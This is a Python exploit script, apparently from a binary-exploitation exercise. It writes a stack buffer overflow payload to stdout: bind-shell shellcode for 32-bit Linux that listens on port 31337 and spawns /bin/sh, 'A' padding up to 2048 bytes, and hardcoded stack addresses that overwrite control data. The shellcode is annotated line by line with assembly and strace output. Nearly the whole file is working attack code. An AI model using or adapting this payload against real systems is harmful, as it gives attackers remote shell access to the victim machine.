from struct import pack
import sys

shellcode = (
	#socket()		#creates a socket by doing a syscall to SYS_SOCKETCALL(66) (strace output) socket(AF_INET, SOCK_STREAM, IPPROTO_IP) = 3
    b"\x31\xc0"              # xor eax, eax
    b"\x50"                  # push eax
    b"\x6a\x01"              # push 0x1
    b"\x6a\x02"              # push 0x2
    b"\x89\xe1"              # mov ecx, esp

    b"\x31\xdb"              # xor ebx, ebx
    b"\x43"                  # inc ebx
    b"\xb0\x66"              # mov al, 0x66
    b"\xcd\x80"              # int 0x80

    b"\x89\xc6"              # mov esi, eax

    # bind()		#binds the scoket created above to the port 31337 (strace output)bind(3, {sa_family=AF_INET, sin_port=htons(31337), sin_addr=inet_addr("0.0.0.0")}, 22) = 0
    b"\x31\xc0"              # xor eax, eax
    b"\x50"                  # push eax
    b"\x66\x68\x7a\x69"      # push WORD 0x697a
    b"\x66\x6a\x02"          # push WORD 0x02
    b"\x89\xe1"              # mov ecx, esp

    b"\x6a\x16"              # push 0x16
    b"\x51"                  # push ecx
    b"\x56"                  # push esi

    b"\x31\xdb"              # xor ebx, ebx
    b"\xb3\x02"              # mov bl, 0x2
    b"\x89\xe1"              # mov ecx, esp

    b"\xb0\x66"              # mov al, 0x66
    b"\xcd\x80"              # int 0x80

    # listen()			#does a syscall to SYS_LISTEN() (strace output) listen(3, 5)
    b"\x31\xc9"              # xor ecx, ecx
    b"\xb1\x05"              # mov cl, 0x5

    b"\x51"                  # push ecx
    b"\x56"                  # push esi

    b"\x89\xe1"              # mov ecx, esp

    b"\x31\xdb"              # xor ebx, ebx
    b"\xb3\x04"              # mov bl, 0x4

    b"\x31\xc0"              # xor eax, eax
    b"\xb0\x66"              # mov al, 0x66
    b"\xcd\x80"              # int 0x80

    # accept()			#does a syscall to SYS_ACCEPT (strace output) accept(3, NULL, NULL) 
    b"\x31\xc9"              # xor ecx, ecx
    b"\x51"                  # push ecx
    b"\x51"                  # push ecx
    b"\x56"                  # push esi
    b"\x89\xe1"              # mov ecx, esp

    b"\x31\xdb"              # xor ebx, ebx
    b"\xb3\x05"              # mov bl, 0x5

    b"\x31\xc0"              # xor eax, eax
    b"\xb0\x66"              # mov al, 0x66
    b"\xcd\x80"              # int 0x80

    b"\x89\xc6"              # mov esi, eax

    # dup2()			#does a syscall to dup2 which duplicates the file descriptors for stdin(0),stdout(1),stderr(2) 
    b"\x89\xf3"              # mov ebx, esi
    b"\x31\xc9"              # xor ecx, ecx
						#dup2(4, 0)                              = 0
    b"\x31\xc0"              # xor eax, eax
    b"\xb0\x3f"              # mov al, 0x3f
    b"\xcd\x80"              # int 0x80

    b"\x41"                  # inc ecx
    b"\x31\xc0"              # xor eax, eax	#dup2(4, 1)                              = 1
    b"\xb0\x3f"              # mov al, 0x3f
    b"\xcd\x80"              # int 0x80
						#dup2(4, 2)                              = 2
    b"\x41"                  # inc ecx
    b"\x31\xc0"              # xor eax, eax
    b"\xb0\x3f"              # mov al, 0x3f
    b"\xcd\x80"              # int 0x80

    # execve()
    b"\x31\xc9"              # xor ecx, ecx	#the usual /bin/sh call being passed through execve
    b"\xf7\xe1"              # mul ecx
    b"\x51"                  # push ecx
    b"\x68\x2f\x2f\x73\x68"  # push 0x68732f2f
    b"\x68\x2f\x62\x69\x6e"  # push 0x6e69622f
    b"\x89\xe3"              # mov ebx, esp
    b"\xb0\x0b"              # mov al, 0xb
    b"\xcd\x80"              # int 0x80
)


       
sys.stdout.buffer.write(shellcode)				
print("A" * (2048 - len(shellcode)), flush=True, end='')	#filling the rest of the buffer with A(buffer overflow) taking into account p,a 
sys.stdout.buffer.write(pack("<I",0xfffe9038 - 0x810))		# a w.r.t ebp
sys.stdout.buffer.write(pack("<I",0xfffe9038 + 4))		# p w.r.t ebp

